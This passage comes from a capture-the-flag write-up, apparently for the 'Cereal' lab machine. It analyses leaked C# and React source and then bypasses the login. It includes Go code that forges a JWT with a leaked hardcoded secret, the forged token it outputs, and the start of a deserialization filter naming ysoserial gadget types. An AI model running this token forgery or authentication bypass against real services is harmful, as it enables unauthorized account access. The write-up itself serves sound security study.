</span></span><span class="line"><span class="cl"><span class="err">...&lt;SNIP&gt;...</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;AllowedHosts&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ApplicationOptions&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Whitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;IpRateLimiting&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;EnableEndpointRateLimiting&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;StackBlockedRequests&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;RealIpHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-Real-IP&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ClientIdHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-ClientId&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;HttpStatusCode&#34;</span><span class="p">:</span> <span class="mi">429</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;IpWhitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;EndpointWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ClientWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;GeneralRules&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;post:/requests&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">150</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">services</span><span class="p">.</span><span class="n">AddAuthentication</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">DefaultAuthenticateScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">DefaultChallengeScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">AddJwtBearer</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">RequireHttpsMetadata</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">SaveToken</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">TokenValidationParameters</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TokenValidationParameters</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ValidateIssuerSigningKey</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">IssuerSigningKey</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">ValidateIssuer</span> <span class="p">=</span> <span class="k">false</span><span class="p">,</span> <span class="c1">// &lt;== No validation</span>
</span></span><span class="line"><span class="cl">            <span class="n">ValidateAudience</span> <span class="p">=</span> <span class="k">false</span> <span class="c1">// &lt;== No validation</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span></code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="n">User</span> <span class="n">Authenticate</span><span class="p">(</span><span class="kt">string</span> <span class="n">username</span><span class="p">,</span> <span class="kt">string</span> <span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">user</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Users</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">Username</span> <span class="p">==</span> <span class="n">username</span> <span class="p">&amp;&amp;</span> <span class="n">x</span><span class="p">.</span><span class="n">Password</span> <span class="p">==</span> <span class="n">password</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1">// return null if user not found</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">user</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1">// authentication successful so generate jwt token</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">tokenHandler</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JwtSecurityTokenHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">tokenDescriptor</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SecurityTokenDescriptor</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Subject</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ClaimsIdentity</span><span class="p">(</span><span class="k">new</span> <span class="n">Claim</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">                    <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">new</span> <span class="n">Claim</span><span class="p">(</span><span class="n">ClaimTypes</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">UserId</span><span class="p">.</span><span class="n">ToString</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Expires</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">UtcNow</span><span class="p">.</span><span class="n">AddDays</span><span class="p">(</span><span class="m">7</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">SigningCredentials</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SigningCredentials</span><span class="p">(</span><span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">SecurityAlgorithms</span><span class="p">.</span><span class="n">HmacSha256Signature</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">CreateToken</span><span class="p">(</span><span class="n">tokenDescriptor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">user</span><span class="p">.</span><span class="n">Token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">WriteToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">user</span><span class="p">.</span><span class="n">WithoutPassword</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), username, and token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">User</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Key]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">int</span> <span class="n">UserId</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Required]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">string</span> <span class="n">Username</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Required]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">string</span> <span class="n">Password</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">string</span> <span class="n">Token</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span></code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">authenticationService</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;../_services&#39;</span><span class="p">;</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">LoginPage</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">super</span><span class="p">(</span><span class="nx">props</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// redirect to home if already logged in
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">authenticationService</span><span class="p">.</span><span class="nx">currentUserValue</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Login</span><span class="o">&lt;</span><span class="err">/h2&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span></code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">currentUserSubject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BehaviorSubject</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;currentUser&#39;</span><span class="p">)));</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">authenticationService</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">login</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">logout</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">currentUser</span><span class="o">:</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">asObservable</span><span class="p">(),</span><span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">get</span> <span class="nx">currentUserValue</span> <span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">value</span> <span class="p">}</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
</span></span></code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<p>And here are the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang. Here is the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;encoding/json&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">UserService</span> <span class="kd">interface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">CreateToken</span><span class="p">(</span><span class="nx">userID</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">jwtService</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">secretKey</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">jwtService</span><span class="p">)</span> <span class="nf">CreateToken</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">claims</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ExpiresAt</span><span class="p">:</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">AddDate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">).</span><span class="nf">UTC</span><span class="p">().</span><span class="nf">Unix</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">t</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">t</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">User</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">UserId</span>   <span class="kt">string</span> <span class="s">`json:&#34;userId,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Username</span> <span class="kt">string</span> <span class="s">`json:&#34;username,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Token</span>    <span class="kt">string</span> <span class="s">`json:&#34;token,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">jwtService</span><span class="p">{}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span><span class="p">.</span><span class="nx">secretKey</span> <span class="p">=</span> <span class="s">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">cu</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">UserId</span><span class="p">:</span>   <span class="s">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Username</span><span class="p">:</span> <span class="s">&#34;iamf&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Token</span><span class="p">:</span>    <span class="nx">jwt</span><span class="p">.</span><span class="nf">CreateToken</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">currentUser</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Marshal</span><span class="p">(</span><span class="nx">cu</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">currentUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It produces the following output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3»
</span></span><span class="line"><span class="cl">$ go run main.go
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;userId&#34;</span>:<span class="s2">&#34;1&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;iamf&#34;</span>,<span class="s2">&#34;token&#34;</span>:<span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span class="o">}</span>
</span></span></code></pre></div><h4 id="login">Login</h4>
<p>At <code>https://cereal.htb</code>, I&rsquo;ll create a new local storage with a key name of  <code>currentUser</code> and I&rsquo;ll put the previous output as the key&rsquo;s value. When I refresh the site, it logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
</p>
<p>Here how the request and the response looklike.</p>
<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<blockquote>
<p>I decided to mix it with images hehe.</p>
</blockquote>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p>
<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
</p>
<p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:</p>
<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
</p>
<p>The cereal database&rsquo;s name can be found inside <code>CerealContext.cs</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
</p>
<p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
</span></span><span class="line"><span class="cl"><span class="na">        [HttpGet(&#34;{id}&#34;)]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">IActionResult</span> <span class="n">Get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">string</span> <span class="n">json</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Requests</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">RequestId</span> <span class="p">==</span> <span class="n">id</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">().</span><span class="n">JSON</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;objectdataprovider&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;windowsidentity&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;system&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">BadRequest</span><span class="p">(</span><span class="k">new</span> <span class="p">{</span> <span class="n">message</span> <span class="p">=</span> <span class="s">&#34;The cereal police have been dispatched.&#34;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">cereal</span> <span class="p">=</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="n">DeserializeObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="k">new</span> <span class="n">JsonSerializerSettings</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
